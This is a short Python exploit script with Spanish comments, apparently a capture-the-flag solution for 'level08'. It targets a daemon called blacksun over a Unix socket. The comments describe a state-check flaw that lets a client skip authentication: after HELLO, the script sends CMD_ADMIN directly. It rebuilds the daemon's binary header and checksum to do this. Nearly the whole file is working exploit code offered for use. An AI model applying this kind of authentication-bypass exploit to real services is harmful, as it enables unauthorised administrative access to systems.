#!/usr/bin/env python3
# Exploit del fallo logico de CHECK_STATE en blacksun.service (level08).
#
# El daemon blacksun expone un socket Unix con un protocolo HELLO -> AUTH ->
# ADMIN. CHECK_STATE deberia exigir haber completado AUTH para aceptar
# CMD_ADMIN, pero para ese caso concreto compara "state >= STATE_AUTH" en
# lugar de "state == STATE_ADMIN". Como HELLO ya deja la sesion en STATE_AUTH,
# basta con enviar HELLO y, a continuacion, CMD_ADMIN directamente: nunca se
# envia AUTH ni se necesita conocer la clave de 32 bytes.

import socket
import struct

SOCKET_PATH = "/run/blacksun/blacksun.sock"


def checksum(payload):
    # Replica compute_checksum() del daemon: XOR de cada byte con su
    # indice (acc ^= byte ^ (index & 0xFF)), truncado a 16 bits.
    result = 0
    for index, value in enumerate(payload):
        result ^= value ^ (index & 0xFF)
    return result & 0xFFFF


def header(command, payload=b""):
    # Construye la cabecera binaria de 8 bytes (msg_header_t) que el
    # daemon espera antes de cada payload:
    #   - byte 0:    version (3 bits, fijo a 1) | state (2 bits, sin usar
    #                por el cliente) | cmd (3 bits, desplazado a los bits
    #                altos con << 5)
    #   - bytes 1-4: longitud del payload, uint32 little-endian
    #   - bytes 5-6: checksum del payload, uint16 little-endian
    #   - byte 7:    byte de relleno/reservado, siempre 0
    first_byte = 1 | (command << 5)
    return (
        bytes([first_byte])
        + struct.pack("<I", len(payload))
        + struct.pack("<H", checksum(payload))
        + b"\0"
    )


with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as client:
    client.connect(SOCKET_PATH)

    # CMD_HELLO (0) con un payload de 2 bytes cualquiera. Esto hace que el
    # daemon cambie el estado de la sesion de STATE_INIT a STATE_AUTH.
    hello = b"\xad\xde"
    client.sendall(header(0, hello) + hello)
    print(client.recv(128).decode(errors="replace"), end="")

    # CMD_ADMIN (2) sin payload y sin haber enviado CMD_AUTH antes.
    # The daemon incorrectly accepts ADMIN while the session is only AUTH.
    client.sendall(header(2))
    print(client.recv(256).decode(errors="replace"), end="")

